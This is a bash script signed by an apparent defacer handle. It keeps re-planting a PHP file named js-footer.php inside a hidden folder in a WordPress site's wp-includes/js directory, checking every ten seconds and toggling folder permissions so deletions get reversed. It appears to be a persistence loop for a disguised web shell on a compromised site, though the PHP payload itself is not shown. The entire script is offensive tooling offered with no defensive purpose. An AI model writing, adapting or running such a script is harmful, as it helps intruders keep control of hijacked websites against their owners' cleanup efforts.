#!/bin/bash
# coded by root@x-krypt0n-x : system of pekalongan
dir="/home/miklfpik/public_html/wp-includes/js"
folderName="A"
folderPath="$dir/$folderName"
indexFile="js-footer.php"

while true
do
  if [ ! -d "$folderPath" ]; then
    mkdir -p "$folderPath"
    cp "$indexFile" "$folderPath"
    chmod 555 "$folderPath" # set folder permission to 555
    echo "Folder $folderName created and $indexFile copied to $folderName folder. Folder permission set to 555."
  else
    indexFilePath="$folderPath/$indexFile"
    if [ ! -f "$indexFilePath" ]; then
      chmod 777 "$folderPath" # set folder permission to 777
      cp "$indexFile" "$folderPath"
      chmod 555 "$folderPath" # set folder permission to 555
      echo "$indexFile copied to $folderName folder. Folder permission set to 777 and then 555."
    else
      echo "$indexFile already exists in $folderName folder."
    fi
  fi
  sleep 10 # wait for 10 seconds before checking again
done
